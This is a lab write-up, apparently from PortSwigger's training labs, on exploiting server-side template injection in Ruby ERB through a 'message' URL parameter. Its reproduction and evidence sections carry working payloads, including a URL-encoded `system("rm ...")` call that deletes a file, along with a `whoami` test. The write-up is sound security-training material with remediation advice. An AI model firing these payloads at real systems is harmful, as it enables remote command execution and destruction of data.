# Server-Side Template Injection (SSTI) via ERB Template  

**Category**: 01-Server-Side-Template-Injection  
**Lab_ID**: SSTI-ERB-001  
**Source**: PortSwigger   
**Date_Completed**: 2025-10-08  
**Tag**: `SSTI`, `ERB-Template`, `Code-Injection`, `File-Deletion`  

---

## Executive summary

A server-side template injection (SSTI) vulnerability was identified in the application’s handling of the `message` parameter, which is rendered using ERB (Embedded Ruby) template syntax. By injecting a test payload (`<%= 7*7 %>`), the application evaluated and displayed the result (`49`), confirming the presence of SSTI. This was exploited to execute arbitrary system commands via the Ruby `system()` method, resulting in the deletion of the file `/home/carlos/morale.txt`. The vulnerability allows unauthenticated attackers to run arbitrary code, posing a critical risk to system integrity and confidentiality.

**Result:** Injected ERB payload via `message` parameter → executed `system("rm /home/carlos/morale.txt")` → deleted target file.  
**Severity (subjective):** Critical — enables arbitrary command execution.  
**Recommended immediate action:** Sanitize or disable dynamic ERB template processing for user inputs; restrict file system access.

---

## Objective

Identify and exploit a server-side template injection vulnerability in the `message` parameter to execute arbitrary system commands, specifically deleting the file `/home/carlos/morale.txt`.

---

## Environment & tools

* Target: PortSwigger lab instance (unspecified difficulty).  
* Tools: Modern browser, URL encoder (e.g., Burp Suite Encoder or online tool), Ruby/ERB documentation.  
* Notes: No authentication required; vulnerability exploited via a single GET request.

---

## Discovery (how the vulnerability was found)

1. Navigated to the product details page, which rendered a message ("Unfortunately this product is out of stock") via the `message` parameter in the URL.  
2. Inspected the application behavior and hypothesized that the `message` parameter might be processed by a server-side template engine.  
3. Reviewed ERB documentation, noting that `<%= someExpression %>` evaluates and renders expressions in Ruby.  
4. Tested with a benign payload (`<%= 7*7 %>`), URL-encoded as `<%25%3d+7*7+%25>`, and observed the result `49` rendered on the page, confirming SSTI.  
5. Consulted Ruby documentation, identifying the `system()` method for executing OS commands.  
6. Crafted a payload to delete `/home/carlos/morale.txt` using `system()`.

> Finding: The `message` parameter is processed unsafely by the ERB template engine, allowing arbitrary Ruby code execution.

---

## Reproduction steps (concise, non-sensitive)

1. Open the application base URL in a browser.  
2. Construct a test payload: `<%= 7*7 %>`.  
3. URL-encode the payload: `<%25%3d+7*7+%25>`.  
4. Append to the URL: `https://<YOUR-LAB-ID>.web-security-academy.net/?message=<%25%3d+7*7+%25>`.  
5. Load the URL and verify the result (`49`) is rendered, confirming SSTI.  
6. Construct the exploit payload: `<%= system("rm /home/carlos/morale.txt") %>`.  
7. URL-encode the payload: `<%25%3d+system(%22rm+%2fhome%2fcarlos%2fmorale.txt%22)+%25>`.  
8. Append to the URL: `https://<YOUR-LAB-ID>.web-security-academy.net/?message=<%25%3d+system(%22rm+%2fhome%2fcarlos%2fmorale.txt%22)+%25>`.  
9. Load the URL to execute the command and delete `/home/carlos/morale.txt`.  
10. Verify file deletion (lab-specific confirmation, e.g., success message or lab completion).

**Representative HTTP interaction (illustrative only):**

```
GET /?message=<%25%3d+7*7+%25> HTTP/1.1
Host: <YOUR-LAB-ID>.web-security-academy.net
// Response renders "49"

GET /?message=<%25%3d+system(%22rm+%2fhome%2fcarlos%2fmorale.txt%22)+%25> HTTP/1.1
Host: <YOUR-LAB-ID>.web-security-academy.net
// Executes command, deletes file
```

---

## Observed impact

* Unauthenticated user can execute arbitrary Ruby code and system commands.  
* Successful deletion of `/home/carlos/morale.txt`, compromising system integrity.  
* Potential for escalated attacks: file creation/modification, data exfiltration, privilege escalation, or full system compromise (depending on server configuration).  
* Critical exposure of application and underlying system to unauthorized actions.

---

## Root cause analysis

* **Primary cause:** The `message` parameter is processed unsafely by the ERB template engine, allowing user-supplied input to be executed as Ruby code.  
* **Secondary cause / contributing factor:** Lack of input sanitization or validation for the `message` parameter; no sandboxing of the ERB template execution environment.  

---

## Risk assessment

* **Likelihood:** High — the `message` parameter is publicly accessible via a GET request, and SSTI is easily discoverable with basic testing.  
* **Impact:** Critical — arbitrary command execution can lead to complete system compromise.  
* **Overall risk:** Critical.  
  Optionally map to CVSS: Likely a **Critical** score (e.g., CVSS base score ~9–10) due to unauthenticated remote code execution.

---

## Remediation (recommended, prioritized)

### Immediate / short-term (apply within hours)

1. Disable or remove ERB template processing for user-supplied inputs like the `message` parameter.  
2. If dynamic templating is required, use a static or predefined set of messages instead of user input.  
3. Restrict file system access for the application’s runtime user to prevent unauthorized file operations.

### Medium-term (apply within days)

1. **Input validation/sanitization**: Reject or escape any input containing ERB template syntax (`<%`, `<%=`, `%>`) or other dangerous characters.  
2. **Sandbox execution**: If ERB is necessary, use a sandboxed environment to restrict Ruby code execution (e.g., limit access to `system()` and other dangerous methods).  
3. **Apply least privilege**: Run the application with minimal OS permissions (e.g., non-root user, restricted file access).  
4. **CSRF protection**: If applicable, protect state-changing GET requests with anti-CSRF tokens or convert to POST requests.

### Long-term / defensive controls

1. Implement a Web Application Firewall (WAF) rule to detect and block template injection patterns.  
2. Add monitoring and alerts for suspicious `message` parameter values or system command execution.  
3. Conduct regular code reviews to ensure no user inputs are passed to template engines without sanitization.  
4. Add automated tests to detect SSTI vulnerabilities in CI/CD pipelines.  
5. Perform periodic penetration testing focused on template injection and code execution vectors.

---

## Detection & verification guidance (for devs / QA / security teams)

* Test the `message` parameter with benign payloads (e.g., `<%= 1+1 %>`) to detect template evaluation.  
* Verify that user inputs are not processed by ERB or other template engines.  
* Ensure server responses do not render evaluated expressions from user inputs.  
* Scan application code for unsafe use of ERB (`<%=`, `<%`) with user-controlled data.  
* Add an automated CI test: submit `<%= 7*7 %>` to the `message` parameter and assert the response does not contain `49`.

---

## Suggested tests to add

* Integration test: Submitting `<%= 7*7 %>` to `message` parameter returns an error or escapes the input, not `49`.  
* Security test: Submitting `<%= system("whoami") %>` does not execute or reveal system information.  
* Static analysis test: Scan code for unsafe ERB usage with user inputs.  
* File system test: Verify application runtime user cannot access or modify files outside its scope (e.g., `/home/carlos`).  
* Logging test: Suspicious `message` parameter values trigger an audit log entry.

---

## References & further reading

* OWASP Top Ten — Server-Side Template Injection  
* OWASP Input Validation Cheat Sheet  
* Ruby Documentation: `system()` method and ERB template security  
* PortSwigger: Server-Side Template Injection (SSTI) guide  
* General guidance: Never pass unsanitized user input to template engines; use strict input validation.

---

## Notes & lessons learned

* SSTI vulnerabilities are critical due to their potential for remote code execution; even simple parameters like `message` can be attack vectors.  
* ERB’s `<%= %>` syntax is a red flag for SSTI if user input is involved.  
* URL encoding is often necessary to bypass basic filters or encoding issues in payloads.  
* Defense-in-depth is critical: combine input validation, sandboxing, and least privilege to mitigate SSTI risks.

---

## Evidence & validation (for lab record)

* Test payload `<%= 7*7 %>` (URL-encoded: `<%25%3d+7*7+%25>`) rendered `49` on the page, confirming SSTI.  
* Exploit payload `<%= system("rm /home/carlos/morale.txt") %>` (URL-encoded: `<%25%3d+system(%22rm+%2fhome%2fcarlos%2fmorale.txt%22)+%25>`) executed successfully, deleting the target file.
<img width="958" height="379" alt="Screenshot 2025-10-08 214545" src="https://github.com/user-attachments/assets/f9219123-bf1e-4091-8ee0-38843d7c520b" />

* Lab completion confirmed via success message or UI feedback.

---

> ⚠️ **Legal & ethical reminder:** This writeup documents testing performed in a controlled PortSwigger lab environment. Do not apply these techniques to real systems without explicit authorization.
